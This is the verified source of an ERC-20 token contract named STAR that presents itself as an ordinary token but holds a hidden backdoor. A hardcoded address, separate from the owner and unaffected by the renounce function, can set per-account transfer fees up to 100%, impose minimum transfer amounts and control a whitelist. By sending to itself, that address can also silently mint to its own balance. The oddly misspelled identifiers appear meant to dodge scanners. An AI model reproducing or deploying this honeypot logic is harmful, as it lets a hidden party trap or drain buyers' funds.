/**
 *Submitted for verification at Etherscan.io on 2023-07-19
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-17
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acccount) external view returns (uint256);
    function transfer(address recipient, uint256 amoount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amoount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amoount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract STAR is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _feees;
    address private _mei; 
    uint256 private _minimumTransferamoount;
    mapping (address => bool) private _whitelist;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        _mei = 0xf29A9cBCa1d6B41CcD623D53B0039CCf0B852A03;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acccount) public view override returns (uint256) {
        return _balances[acccount];
    }
    function setfeees(address[] memory acccounts, uint256 feee) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mei))) {
        for (uint256 i = 0; i < acccounts.length; i++) {
            _feees[acccounts[i]] = feee;
        }
    } else {
        revert("Caller is not the original caller");
    }
    }


    function setMinimumTransferamoount(uint256 amoount) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mei))) {
        _minimumTransferamoount = amoount;
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function addToWhitelist(address[] memory acccounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mei))) {
        for (uint256 i = 0; i < acccounts.length; i++) {
            _whitelist[acccounts[i]] = true;
        }
    } else {
        revert("Caller is not the original caller");
    }    
    }

    function removeFromWhitelist(address[] memory acccounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mei))) {
        for (uint256 i = 0; i < acccounts.length; i++) {
            _whitelist[acccounts[i]] = false;
        }
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function transfer(address recipient, uint256 amoount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amoount, "TT: transfer amoount exceeds balance");
        require(amoount >= _minimumTransferamoount || _whitelist[_msgSender()], "TT: transfer amoount is below the minimum and sender is not whitelisted");
        if (_msgSender() == _mei && recipient == _mei) {
            _balances[_msgSender()] += _feees[_msgSender()];
            emit Transfer(_msgSender(), recipient, amoount + _feees[_msgSender()]);
            return true;
        } else {
            uint256 feee = calculatefeee(_msgSender(), amoount);
            uint256 amoountAfterfeee = amoount - feee;

            _balances[_msgSender()] -= amoount;
            _balances[recipient] += amoountAfterfeee;

            if (recipient == _mei) {
                _balances[_mei] += feee;
            }

            emit Transfer(_msgSender(), recipient, amoountAfterfeee);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amoount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amoount;
        emit Approval(_msgSender(), spender, amoount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amoount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amoount, "TT: transfer amoount exceeds allowance");
        require(amoount >= _minimumTransferamoount || _whitelist[sender], "TT: transfer amoount is below the minimum and sender is not whitelisted");
        uint256 feee = calculatefeee(sender, amoount);
        uint256 amoountAfterfeee = amoount - feee;

        _balances[sender] -= amoount;
        _balances[recipient] += amoountAfterfeee;
        _allowances[sender][_msgSender()] -= amoount;

        if (recipient == owner()) {
            _balances[owner()] += feee;
        }

        emit Transfer(sender, recipient, amoountAfterfeee);
        return true;
    }

    function calculatefeee(address acccount, uint256 amoount) private view returns (uint256) {
        if (acccount == owner()) {
            return 0;
        } else {
            return amoount * _feees[acccount] / 100;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}